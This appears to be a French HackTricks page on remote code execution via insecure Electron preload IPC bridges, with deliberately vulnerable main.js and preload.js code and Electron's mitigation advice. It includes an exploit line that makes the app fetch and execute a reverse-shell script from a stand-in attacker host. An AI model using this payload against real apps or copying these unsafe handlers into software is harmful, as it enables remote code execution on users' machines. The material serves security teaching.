# RCE via IPC dans Electron avec contextIsolation

{{#include ../../banners/hacktricks-training.md}}

L’isolation du contexte ne rend pas sûr un bridge preload dangereux. Si un preload expose un IPC privilégié au contenu du renderer, une XSS ou un renderer compromis peut appeler ce bridge ; le RCE dépend alors de la validation et des capacités du handler correspondant dans le processus main. Electron recommande d’exposer une seule méthode spécifique par opération, de valider les émetteurs IPC et de ne jamais exposer les primitives IPC brutes.<sup>[[3]](#references)[[4]](#references)</sup>

**La plupart de ces exemples proviennent d’ici** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Regardez la vidéo pour plus d’informations.<sup>[[1]](#references)</sup>

## Exemple 0

Exemple tiré de [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (les diapositives présentent l’exemple complet de la façon dont MS Teams était exploité, d’une XSS à un RCE ; voici simplement un exemple très basique) :<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Exemple 1

Voyez comment `main.js` écoute `getUpdate` et **télécharge puis exécute n’importe quelle URL** transmise.\
Voyez aussi comment `preload.js` **expose tous les événements IPC** provenant du processus main.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Exemple 2

Si le preload expose `shell.openExternal` sans validation du schéma ni de la destination, une entrée contrôlée par le renderer peut lancer des gestionnaires externes enregistrés. Cela peut entraîner une exécution de code selon la plateforme, les gestionnaires installés, le schéma et la version d’Electron ; limitez cette fonction à une allowlist explicite des destinations `https:` attendues.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Exemple 3

Si le preload expose une communication sans restriction avec le processus principal, une XSS peut envoyer des noms de canal et des données arbitraires. L’impact dépend des gestionnaires IPC enregistrés et de leurs vérifications d’autorisation.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [Atelier sur le hacking des applications de bureau modernes avec XSS et RCE](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Comment j’ai hacké Microsoft Teams et remporté 150 000 $ à Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — Liste de vérification de sécurité](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — Isolation du contexte et exposition sécurisée des API](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
